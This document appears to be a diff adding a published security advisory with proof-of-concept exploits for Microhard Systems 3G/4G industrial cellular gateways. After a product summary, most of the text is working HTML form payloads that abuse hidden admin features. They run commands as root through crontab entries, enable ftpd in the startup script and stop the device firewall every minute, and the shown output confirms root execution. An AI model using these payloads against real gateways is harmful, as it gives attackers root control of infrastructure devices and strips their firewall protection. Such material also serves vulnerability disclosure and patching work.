@@ -1,0 +1,287 @@
+Microhard Systems 3G/4G Cellular Ethernet and Serial Gateway Remote Root Exploit
+
+
+Vendor: Microhard Systems Inc.
+Product web page: http://www.microhardcorp.com
+Affected version: IPn4G 1.1.0 build 1098
+                  IPn3Gb 2.2.0 build 2160
+                  IPn4Gb 1.1.6 build 1184-14
+                  IPn4Gb 1.1.0 Rev 2 build 1090-2
+                  IPn4Gb 1.1.0 Rev 2 build 1086
+                  Bullet-3G 1.2.0 Rev A build 1032
+                  VIP4Gb 1.1.6 build 1204
+                  VIP4G 1.1.6 Rev 3.0 build 1184-14
+                  VIP4G-WiFi-N 1.1.6 Rev 2.0.0 build 1196
+                  IPn3Gii / Bullet-3G 1.2.0 build 1076
+                  IPn4Gii / Bullet-LTE 1.2.0 build 1078
+                  BulletPlus 1.3.0 build 1036
+                  Dragon-LTE 1.1.0 build 1036
+
+Summary: The new IPn4Gb provides a rugged, industrial strength wireless solution
+using the new and ultra fast 4G LTE cellular network infrastructure. The IPn4Gb
+features integrated Firewall, IPSec / VPN & GRE Tunneling, IP/MAC Access Control
+Lists. The IPn4Gb can transport critical data to and from SMS, Ethernet and Serial
+RS232/485/422 devices!
+
+The IPn3Gb provides a fast, secure industrial strength wireless solution that uses
+the widespread deployment of cellular network infrastructure for critical data collection.
+From remote meters and sensors, to providing mobile network access, the IPn3Gb delivers!
+The IPn3Gb is a powerful HSPA+ and Quad Band GSM device compatible almost anywhere. It
+provides robust and secure wireless communication of Serial, USB and Ethernet data.
+
+The all new Bullet-3G provides a compact, robust, feature packed industrial strength
+wireless solution using fast 3G/HSPA+ network infrastructure. The Bullet-3G takes things
+to the next level by providing features such as Ethernet with PoE, RS232 Serial port
+and 2x Programmable I/O. Offering enhanced, 'Secure Communication' with its integrated
+Firewall, IPSec VPN Tunneling, IP/MAC Access Control Lists, the Bullet-3G is a solution
+worth looking at!
+
+The all new Dragon-LTE provides a feature packed, compact OEM, industrial strength
+wireless IoT & M2M solution. Connect any device, wired or wireless, and provide remote
+cellular access using the Dragon-LTE. The Dragon-LTE features a OEM design for tight
+system integration and design flexibility with dual Ethernet Ports and high power
+802.11b/g/n WIFI. With its integrated Firewall, IPSec VPN Tunneling and IP/MAC Access
+Control Lists, the Dragon-LTE provides a solution for any cellular application!
+
+The new VIP4Gb provides a rugged, industrial strength wireless solution using 4G LTE
+network infrastructure for critical data communications. The VIP4Gb provides simultaneous
+network connections for 802.11a/b/g/n WiFi devices, 4 x 10/100/1000 Ethernet ports, Digital
+I/O, and a RS232/RS485 port, resulting in a communication device that can be deployed in
+any application! The VIP4Gb is a powerful 4G LTE device compatible on any cellular network.
+It provides robust and secure wireless communication of Serial, Ethernet & WiFi data.
+
+Desc: The application suffers from multiple authenticated arbitrary remote code execution
+vulnerabilities with highest privileges. This is due to multiple hidden and undocumented
+features within the admin interface that allows an attacker to create crontab jobs and/or
+modify the system startup script that allows execution of arbitrary code as root user.
+
+Tested on: httpd-ssl-1.0.0
+           Linux 2.6.32.9 (Bin@DProBuilder) (gcc version 4.4.3)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2018-5479
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5479.php
+
+
+13.03.2018
+
+--
+
+
+Crontab #1:
+-----------
+
+<html>
+  <body>
+    <form action="http://192.168.1.1/cgi-bin/webif/system-crontabs.sh" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="submit" value="1" />
+      <input type="hidden" name="sltMinutes" value="" />
+      <input type="hidden" name="sltHours" value="" />
+      <input type="hidden" name="sltDays" value="" />
+      <input type="hidden" name="sltMonths" value="" />
+      <input type="hidden" name="sltDaysOfWeek" value="" />
+      <input type="hidden" name="txthMinutes" value="" />
+      <input type="hidden" name="txthHours" value="" />
+      <input type="hidden" name="txthDays" value="" />
+      <input type="hidden" name="txthMonths" value="" />
+      <input type="hidden" name="txthDaysOfWeek" value="" />
+      <input type="hidden" name="ddEveryXminute" value="" />
+      <input type="hidden" name="ddEveryXhour" value="" />
+      <input type="hidden" name="ddEveryXday" value="" />
+      <input type="hidden" name="txtCommand" value="" />
+      <input type="hidden" name="txthCronEnabled" value="0" />
+      <input type="hidden" name="txtCrontabEntry" value="" />
+      <input type="hidden" name="MINUTES_cfg02e2c8" value="*/3" />
+      <input type="hidden" name="HOURS_cfg02e2c8" value="*" />
+      <input type="hidden" name="DAYS_cfg02e2c8" value="*" />
+      <input type="hidden" name="MONTHS_cfg02e2c8" value="*" />
+      <input type="hidden" name="WEEKDAYS_cfg02e2c8" value="*" />
+      <input type="hidden" name="COMMAND_cfg02e2c8" value="/etc/init.d/ntpclient start" />
+      <input type="hidden" name="ENABLED_cfg02e2c8" value="1" />
+      <input type="hidden" name="MINUTES_cfg04b4e9" value="*" />
+      <input type="hidden" name="HOURS_cfg04b4e9" value="*" />
+      <input type="hidden" name="DAYS_cfg04b4e9" value="*" />
+      <input type="hidden" name="MONTHS_cfg04b4e9" value="*" />
+      <input type="hidden" name="WEEKDAYS_cfg04b4e9" value="*" />
+      <input type="hidden" name="COMMAND_cfg04b4e9" value="id > /www/pwn.txt" />
+      <input type="hidden" name="ENABLED_cfg04b4e9" value="1" />
+      <input type="hidden" name="MINUTES_newCron" value="" />
+      <input type="hidden" name="HOURS_newCron" value="" />
+      <input type="hidden" name="DAYS_newCron" value="" />
+      <input type="hidden" name="MONTHS_newCron" value="" />
+      <input type="hidden" name="WEEKDAYS_newCron" value="" />
+      <input type="hidden" name="COMMAND_newCron" value="" />
+      <input type="hidden" name="ENABLED_newCron" value="" />
+      <input type="hidden" name="action" value="Save Changes" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+---
+
+curl http://192.168.1.1/pwn.txt
+uid=0(root) gid=0(root) groups=0(root)
+
+
+Start ftpd:
+-----------
+
+<html>
+  <body>
+    <form action="http://192.168.1.1/cgi-bin/webif/system-startup.sh" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="path" value="/etc/init.d" />
+      <input type="hidden" name="edit" value="custom-user-startup" />
+      <input type="hidden" name="filecontent" value="#!/bin/sh /etc/rc.common
+START=90
+# place your own startup commands here
+#
+# REMEMBER: You *MUST* place an '&' after launching programs you 
+#   that are to continue running in the background.
+#
+#   i.e. 
+#   BAD:  upnpd
+#   GOOD: upnpd &
+# 
+# Failure to do this will result in the startup process halting
+# on this file and the diagnostic light remaining on (at least
+# for WRT54G(s) models).
+#
+
+ftpd &
+
+" />
+      <input type="hidden" name="save" value="Â Save ChangesÂ " />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+Crontab #2:
+-----------
+
+<html>
+  <body>
+    <form action="http://192.168.1.1/cgi-bin/webif/system-crontabs.sh" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="submit" value="1" />
+      <input type="hidden" name="sltMinutes" value="" />
+      <input type="hidden" name="sltHours" value="" />
+      <input type="hidden" name="sltDays" value="" />
+      <input type="hidden" name="sltMonths" value="" />
+      <input type="hidden" name="sltDaysOfWeek" value="" />
+      <input type="hidden" name="txthMinutes" value="*" />
+      <input type="hidden" name="txthHours" value="*" />
+      <input type="hidden" name="txthDays" value="*" />
+      <input type="hidden" name="txthMonths" value="*" />
+      <input type="hidden" name="txthDaysOfWeek" value="*" />
+      <input type="hidden" name="ddEveryXminute" value="" />
+      <input type="hidden" name="ddEveryXhour" value="" />
+      <input type="hidden" name="ddEveryXday" value="" />
+      <input type="hidden" name="txtCommand" value="uname -a >/www/os.txt ; ls -la /www >> /www/os.txt ; id >> /www/os.txt" />
+      <input type="hidden" name="chkCronEnabled" value="on" />
+      <input type="hidden" name="txthCronEnabled" value="1" />
+      <input type="hidden" name="txtCrontabEntry" value="* * * * * uname -a >/www/os.txt ; ls -la /www >> /www/os.txt ; id >> /www/os.txt" />
+      <input type="hidden" name="MINUTES_cfg02e2c8" value="*/3" />
+      <input type="hidden" name="HOURS_cfg02e2c8" value="*" />
+      <input type="hidden" name="DAYS_cfg02e2c8" value="*" />
+      <input type="hidden" name="MONTHS_cfg02e2c8" value="*" />
+      <input type="hidden" name="WEEKDAYS_cfg02e2c8" value="*" />
+      <input type="hidden" name="COMMAND_cfg02e2c8" value="/etc/init.d/ntpclient start" />
+      <input type="hidden" name="ENABLED_cfg02e2c8" value="1" />
+      <input type="hidden" name="MINUTES_cfg0421ec" value="*" />
+      <input type="hidden" name="HOURS_cfg0421ec" value="*" />
+      <input type="hidden" name="DAYS_cfg0421ec" value="*" />
+      <input type="hidden" name="MONTHS_cfg0421ec" value="*" />
+      <input type="hidden" name="WEEKDAYS_cfg0421ec" value="*" />
+      <input type="hidden" name="COMMAND_cfg0421ec" value="uname -a >/www/os.txt ; ls -la /www >> /www/os.txt ; id >> /www/os.txt" />
+      <input type="hidden" name="ENABLED_cfg0421ec" value="1" />
+      <input type="hidden" name="MINUTES_newCron" value="" />
+      <input type="hidden" name="HOURS_newCron" value="" />
+      <input type="hidden" name="DAYS_newCron" value="" />
+      <input type="hidden" name="MONTHS_newCron" value="" />
+      <input type="hidden" name="WEEKDAYS_newCron" value="" />
+      <input type="hidden" name="COMMAND_newCron" value="" />
+      <input type="hidden" name="ENABLED_newCron" value="" />
+      <input type="hidden" name="action" value="Save Changes" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+---
+
+curl http://192.168.1.1/os.txt
+Linux IPn4G 2.6.32.9 #1 Mon Jun 20 15:28:30 MDT 2016 mips GNU/Linux
+drwxr-xr-x    5 root     root            0 Jul  1 14:01 .
+drwxr-xr-x    7 root     root            0 Dec 31  1969 ..
+-rw-r--r--    1 root     root            4 Apr 12  2010 .version
+-rw-r--r--    1 root     root        13461 May  8 15:54 IPn4G.config
+drwxr-xr-x    3 root     root            0 Jun 20  2016 cgi-bin
+-rw-r--r--    1 root     root         2672 Apr  1  2010 colorize.js
+-rwxr-xr-x    1 root     root         3638 May 10  2010 favicon.ico
+drwxr-xr-x    2 root     root          959 Jun 20  2016 images
+-rw-r--r--    1 root     root          600 Feb 12  2013 index.html
+drwxr-xr-x    2 root     root          224 Jun 20  2016 js
+-rw-r--r--    1 root     root           68 Mar  1 14:09 os.txt
+drwxr-xr-x    2 root     root           79 Jun 20  2016 svggraph
+drwxr-xr-x    2 root     root            0 Jul  1 14:02 themes
+drwxr-xr-x    2 root     root            0 May  8 16:21 vnstat
+-rw-r--r--    1 root     root          953 Apr  1  2010 webif.js
+uid=0(root) gid=0(root) groups=0(root)
+
+
+Disable firewall:
+-----------------
+
+<html>
+  <body>
+    <form action="http://192.168.1.1/cgi-bin/webif/system-crontabs.sh" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="submit" value="1" />
+      <input type="hidden" name="sltMinutes" value="" />
+      <input type="hidden" name="sltHours" value="" />
+      <input type="hidden" name="sltDays" value="" />
+      <input type="hidden" name="sltMonths" value="" />
+      <input type="hidden" name="sltDaysOfWeek" value="" />
+      <input type="hidden" name="txthMinutes" value="*" />
+      <input type="hidden" name="txthHours" value="*" />
+      <input type="hidden" name="txthDays" value="*" />
+      <input type="hidden" name="txthMonths" value="*" />
+      <input type="hidden" name="txthDaysOfWeek" value="*" />
+      <input type="hidden" name="ddEveryXminute" value="" />
+      <input type="hidden" name="ddEveryXhour" value="" />
+      <input type="hidden" name="ddEveryXday" value="" />
+      <input type="hidden" name="txtCommand" value="/etc/init.d/firewall stop" />
+      <input type="hidden" name="chkCronEnabled" value="on" />
+      <input type="hidden" name="txthCronEnabled" value="1" />
+      <input type="hidden" name="txtCrontabEntry" value="* * * * * /etc/init.d/firewall stop" />
+      <input type="hidden" name="MINUTES_cfg02e2c8" value="*/3" />
+      <input type="hidden" name="HOURS_cfg02e2c8" value="*" />
+      <input type="hidden" name="DAYS_cfg02e2c8" value="*" />
+      <input type="hidden" name="MONTHS_cfg02e2c8" value="*" />
+      <input type="hidden" name="WEEKDAYS_cfg02e2c8" value="*" />
+      <input type="hidden" name="COMMAND_cfg02e2c8" value="/etc/init.d/ntpclient start" />
+      <input type="hidden" name="ENABLED_cfg02e2c8" value="1" />
+      <input type="hidden" name="MINUTES_cfg04f65b" value="*" />
+      <input type="hidden" name="HOURS_cfg04f65b" value="*" />
+      <input type="hidden" name="DAYS_cfg04f65b" value="*" />
+      <input type="hidden" name="MONTHS_cfg04f65b" value="*" />
+      <input type="hidden" name="WEEKDAYS_cfg04f65b" value="*" />
+      <input type="hidden" name="COMMAND_cfg04f65b" value="/etc/init.d/firewall stop" />
+      <input type="hidden" name="ENABLED_cfg04f65b" value="1" />
+      <input type="hidden" name="MINUTES_newCron" value="" />
+      <input type="hidden" name="HOURS_newCron" value="" />
+      <input type="hidden" name="DAYS_newCron" value="" />
+      <input type="hidden" name="MONTHS_newCron" value="" />
+      <input type="hidden" name="WEEKDAYS_newCron" value="" />
+      <input type="hidden" name="COMMAND_newCron" value="" />
+      <input type="hidden" name="ENABLED_newCron" value="" />
+      <input type="hidden" name="action" value="Save Changes" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
